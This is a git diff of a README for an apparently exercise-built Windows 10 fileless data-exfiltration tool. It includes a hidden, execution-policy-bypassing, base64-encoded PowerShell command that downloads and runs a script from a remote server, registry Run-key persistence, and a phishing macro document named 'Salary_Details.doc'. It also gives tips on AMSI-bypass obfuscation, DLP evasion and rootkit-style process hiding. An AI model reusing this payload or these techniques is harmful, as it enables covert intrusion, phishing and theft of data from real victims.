@@ -18,7 +18,7 @@ Write code for Windows 10 that:
 
 The persistence in the execution of this software is implemented by adding an entry in the registry path: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` which is executed each time the user log in.
 
-This payload makes a GET request to the server to load the software into memory and executes it.
+This payload makes a GET request to the server to load the software into memory and executes it. With this implementation the attacker can know when the user is logged into the computer because a GET request always will be do to the exfiltration server during user login.
 
 ```
 powershell.exe -NoProfile -Noninteractive -ExecutionPolicy Bypass -WindowStyle Hidden -enc aQBlAHgAIAAoAGkAdwByACAAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA1ADYALgAxADoAOAAwADgAMAAvAG0AYQBpAG4ALgBwAHMAMQAnACkA
@@ -30,9 +30,15 @@ powershell.exe -NoProfile -Noninteractive -ExecutionPolicy Bypass -WindowStyle H
 
 The code developed is 100% fileless as it does not need to write nothing on disk. It is loaded into memory during the login process for a user and all the operations are performed into memory.
 
+The PowerShell code `main.ps1` is not obfuscated in any way making easier the comprehension of the reader. In commons attacks the bad actors will use techniques to obfuscate code and make forensics tasks harder. There are several tools that can be used to obfuscate the code, one of most common is Unicorn <https://github.com/trustedsec/unicorn>. It generates an obfuscate Powershell script with AMSI bypass. The obfuscated script can be found in `obfuscated.txt`.
+
 #### Dropper
 
-A very basic example of a VisualBasic macro has been added just to simulate a possible first step into the attack vector. This macro executes a powershell instance loading into memory the payload from the remote server and executing it.
+The most common way to compromise a corporate network is executing a phishing attack to its employees. It is an usual technique the use of Visual Basic scripts inserted into MS Office documents sending them by email or forcing to the users to download them. One common tool to create this kind of documents is Out-Word <https://github.com/samratashok/nishang/blob/master/Client/Out-Word.ps1> from Nishang repository. Using this tool an evil document with a juicy name `Salary_Details.doc` has been created. The script for the macro is located in `dropper.vbs` file. When this document is open and if the user enable the macro execution, it performs a GET to the evil server to get and execute the payload for the exfiltration.
+
+![Dropper](./img/dropper.png)
+
+![Dropper Gif](./img/drop.gif)
 
 ### Little privileges as possible
 
@@ -81,8 +87,6 @@ python3 webserver.py
 It is necessary to mention here that there are a huge number of features that can be added for AV bypassing and make more difficult possible forensics tasks.
 
 The software implements a basic bypass of possible DLP protections the exfiltrated data is encoded in Base64 before sending to the server. A better approach can be cyphering the payload with dynamic keys encryption gotten from the server.
-
-The PowerShell code is not obfuscated in any way making easier the comprehension of the reader. A useful tool to do that is for example <https://github.com/trustedsec/unicorn>.
 
 If more advanced techniques are required, a better approach could be creating the  software as dll file and inject the code into a running process using the Reflective PE Injection <https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1>. Furthermore, it could be possible to create a hook into Win32 API functions NtQuerySystemInformation acting as a Rootkit hiding processes from the Task Manager and NtCreateUserProcess to launch the exfiltration method when the process WinWord starts.
 
